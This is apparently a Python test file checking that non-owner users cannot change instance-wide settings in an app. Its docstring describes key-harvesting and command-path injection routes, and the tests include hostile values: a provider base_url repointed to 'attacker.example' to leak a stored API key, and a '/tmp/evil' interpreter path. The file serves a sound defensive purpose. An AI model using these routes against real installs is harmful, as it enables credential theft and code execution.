"""Instance-wide configuration is not something every logged-in user may change.

Provider profiles, stored credentials, the TTS interpreter path and plugin enablement belong
to the whole install rather than to a workspace, so they have no workspace id to scope by —
which is how they ended up with no authorization at all beyond "is logged in". Three of those
routes are worse than they sound:

  * PUT /settings/tts sets python_path, which later becomes subprocess argv.
  * PATCH /settings/providers/{id} + GET .../models sends the STORED api key to whatever
    base_url the caller just set.
  * PATCH /plugins/instances/{id}/permissions grants a connection its permissions; invoke then runs it.
"""

from __future__ import annotations

import pytest

from tests.util import fresh_client, second_client


@pytest.fixture()
def owner_and_outsider():
    """`owner` owns a workspace. `outsider` is a logged-in user who owns nothing."""
    owner = fresh_client()
    owner.post("/api/workspaces", json={"name": "W"})
    return owner, second_client("outsider")


ADMIN_ONLY_WRITES = [
    ("put", "/api/settings/tts", {"engine": "f5-tts", "python_path": "/tmp/evil"}),
    (
        "post",
        "/api/settings/providers",
        {"name": "p", "vendor": "openai", "config": {"api_key": "k", "base_url": "http://x/v1"}},
    ),
    ("post", "/api/plugins/scan", None),
]


@pytest.mark.parametrize(("method", "path", "body"), ADMIN_ONLY_WRITES)
def test_a_user_who_owns_nothing_cannot_change_instance_settings(owner_and_outsider, method, path, body) -> None:
    _, outsider = owner_and_outsider
    res = getattr(outsider, method)(path, json=body) if body is not None else getattr(outsider, method)(path)
    assert res.status_code == 403, f"{method.upper()} {path} returned {res.status_code}"


def test_legacy_credentials_api_is_removed(owner_and_outsider) -> None:
    owner, outsider = owner_and_outsider
    assert owner.get("/api/settings/credentials").status_code == 404
    assert owner.put("/api/settings/credentials", json={"provider": "openai", "secret": "sk-SECRET"}).status_code == 404
    assert outsider.delete("/api/settings/credentials/openai").status_code == 404


def test_an_outsider_cannot_repoint_a_provider_and_harvest_its_key(owner_and_outsider) -> None:
    owner, outsider = owner_and_outsider
    profile = owner.post(
        "/api/settings/providers",
        json={"name": "mine", "vendor": "openai", "config": {"api_key": "sk-VICTIM", "base_url": "http://localhost:11434/v1"}},
    )
    assert profile.status_code == 200, profile.text
    profile_id = profile.json()["id"]

    # 改地址是布局,模型探测是那一步"把密钥发出去"的动作。
    assert outsider.patch(
        f"/api/settings/providers/{profile_id}", json={"config": {"base_url": "http://attacker.example/v1"}}
    ).status_code == 403
    assert outsider.delete(f"/api/settings/providers/{profile_id}").status_code == 403

    # 列模型现在**对所有登录用户开放**(他要据此选自己的默认模型),但那已经带不走任何东西:
    # 密钥归人之后,探测用的是**发起者自己**那把 —— 他没有,就什么都不带(见 domain/provider_credentials)。
    assert outsider.get(f"/api/settings/providers/{profile_id}/models").status_code == 200
    listed = outsider.get("/api/settings/providers").json()
    assert all(row["key_hint"] == "" for row in listed), "别人的钥匙提示露出来了"
    acquired = outsider.post(f"/api/agent/provider-credentials/{profile_id}/acquire")
    assert acquired.json().get("credential") is None, "outsider 拿到了别人的凭据"


def test_an_outsider_cannot_grant_plugin_permissions_or_wipe_the_audit_log(owner_and_outsider) -> None:
    _, outsider = owner_and_outsider
    assert outsider.patch("/api/plugins/instances/any-instance/permissions", json={"grants": {}}).status_code == 403
    assert outsider.get("/api/plugins/invocations").status_code == 403
    assert outsider.delete("/api/plugins/invocations").status_code == 403


def test_the_owner_is_not_locked_out_of_their_own_install(owner_and_outsider) -> None:
    """The gate must not break the single-user case it is protecting."""
    owner, _ = owner_and_outsider
    assert owner.put("/api/settings/tts", json={"engine": "f5-tts", "python_path": ""}).status_code == 200
    assert owner.post("/api/plugins/scan").status_code == 200
    created = owner.post(
        "/api/settings/providers",
        json={"name": "p", "vendor": "openai", "config": {"api_key": "k", "base_url": "http://x/v1"}},
    )
    assert created.status_code == 200
    assert owner.get(f"/api/settings/providers/{created.json()['id']}/models").status_code in (200, 502)
